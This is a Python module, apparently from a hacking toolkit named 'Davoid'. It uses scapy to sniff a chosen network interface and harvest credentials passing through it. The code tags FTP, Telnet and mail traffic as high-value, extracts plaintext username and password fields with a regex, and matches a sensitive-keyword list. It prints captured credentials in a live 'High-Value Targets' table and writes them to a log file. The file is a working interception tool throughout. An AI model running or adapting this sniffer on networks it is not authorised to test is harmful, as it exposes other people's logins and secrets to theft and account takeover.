import re
import os
from datetime import datetime
from scapy.all import sniff, IP, TCP, UDP, conf, Raw
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from core.ui import draw_header

console = Console()

# --- Configuration & State ---
SENSITIVE_KEYWORDS = [b"password", b"user",
                      b"pass", b"login", b"pwd", b"auth", b"key"]
captured_data = []  # Stores high-value targets for the live table
log_file = f"logs/interception_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"


def extract_credentials(payload):
    """Attempts to find plaintext credentials in raw payloads."""
    decoded_payload = payload.decode('utf-8', errors='ignore')
    found = []
    # Simple regex for key=value patterns common in forms
    patterns = [
        r"(?i)(user|username|login|email|pass|password|pwd)=(.[^&^ ]*)"
    ]
    for pattern in patterns:
        matches = re.findall(pattern, decoded_payload)
        for m in matches:
            found.append(f"{m[0]}:{m[1]}")
    return found


def packet_callback(packet):
    """Deep Packet Inspection Logic"""
    if not packet.haslayer(IP):
        return

    src = packet[IP].src
    dst = packet[IP].dst
    proto_tag = "[dim][UDP][/dim]"
    info = ""
    is_high_value = False

    if packet.haslayer(TCP):
        port = packet[TCP].dport
        proto_tag = "[bold cyan][TCP][/bold cyan]"

        # Protocol Identification
        if port == 80:
            proto_tag = "[bold green][HTTP][/bold green]"
        elif port == 21:
            proto_tag = "[bold red][FTP][/bold red]"
            is_high_value = True
        elif port == 23:
            proto_tag = "[bold bright_red][TELNET][/bold bright_red]"
            is_high_value = True
        elif port == 445:
            proto_tag = "[bold yellow][SMB][/bold yellow]"
        elif port in [110, 143]:
            proto_tag = "[bold magenta][MAIL][/bold magenta]"
            is_high_value = True

        # Payload Inspection
        if packet.haslayer(Raw):
            load = packet[Raw].load

            # 1. Search for Credentials
            creds = extract_credentials(load)
            if creds:
                info = f"[bold red]CREDENTIALS FOUND: {', '.join(creds)}[/bold red]"
                is_high_value = True

            # 2. Check for sensitive keywords in unknown TCP streams
            elif any(key in load.lower() for key in SENSITIVE_KEYWORDS):
                info = f"[yellow]Sensitive Data Detected: {load[:50]}...[/yellow]"
                is_high_value = True

        # Output to main log
        msg = f"{proto_tag} [white]{src}[/white] -> [magenta]{dst}:{port}[/magenta] {info}"
        console.print(msg)

        # Update high-value capture list
        if is_high_value:
            timestamp = datetime.now().strftime("%H:%M:%S")
            captured_data.append(
                {"time": timestamp, "src": src, "dst": dst, "info": info})
            with open(log_file, "a") as f:
                f.write(f"[{timestamp}] {src} -> {dst} | {info}\n")

    elif packet.haslayer(UDP):
        port = packet[UDP].dport
        if port == 53:
            proto_tag = "[bold blue][DNS][/bold blue]"
            # Could add DNS Query sniffing here
        console.print(
            f"{proto_tag} [dim]{src}[/dim] -> [dim]{dst}:{port}[/dim]")


def generate_live_table():
    """Creates the 'High-Value Targets' dashboard."""
    table = Table(title="Captured High-Value Traffic",
                  expand=True, border_style="red")
    table.add_column("Time", style="cyan", no_wrap=True)
    table.add_column("Source", style="green")
    table.add_column("Target", style="magenta")
    table.add_column("Intel/Payload", style="white")

    # Only show the last 10 interceptions in the table
    for entry in captured_data[-10:]:
        table.add_row(entry["time"], entry["src"], entry["dst"], entry["info"])

    return table


def start_sniffing():
    # Ensure logs directory exists
    if not os.path.exists("logs"):
        os.makedirs("logs")

    draw_header("WLAN LIVE INTERCEPTOR PRO")

    # 1. Interface Discovery
    try:
        ifaces = [i.name for i in conf.ifaces.data.values()]
    except:
        console.print(
            "[bold red][!] Error:[/bold red] Could not retrieve interfaces. Run as root?")
        return

    console.print(Panel(
        f"Available: {', '.join(ifaces)}", title="Interfaces", border_style="blue"))
    chosen_iface = console.input(
        "[bold yellow]Select Interface (e.g., eth0, wlan0): [/bold yellow]").strip()

    if not chosen_iface:
        return

    console.print(f"\n[bold green][*] Session Log: {log_file}[/bold green]")
    console.print(
        f"[bold green][*] Monitoring {chosen_iface}... (CTRL+C to Stop)[/bold green]\n")

    try:
        # The Live context allows the table to update at the top while packets scroll below
        with Live(generate_live_table(), refresh_per_second=1) as live:
            def wrapped_callback(packet):
                packet_callback(packet)
                live.update(generate_live_table())

            sniff(iface=chosen_iface, prn=wrapped_callback, store=False)

    except PermissionError:
        console.print(
            "[bold red][!] Permission Denied: Please run Davoid with 'sudo'.[/bold red]")
    except KeyboardInterrupt:
        console.print(
            "\n[bold yellow][!] Interception halted. Logs saved.[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red][!] Error:[/bold red] {e}")

    input("\nPress Enter to return to Main Menu...")
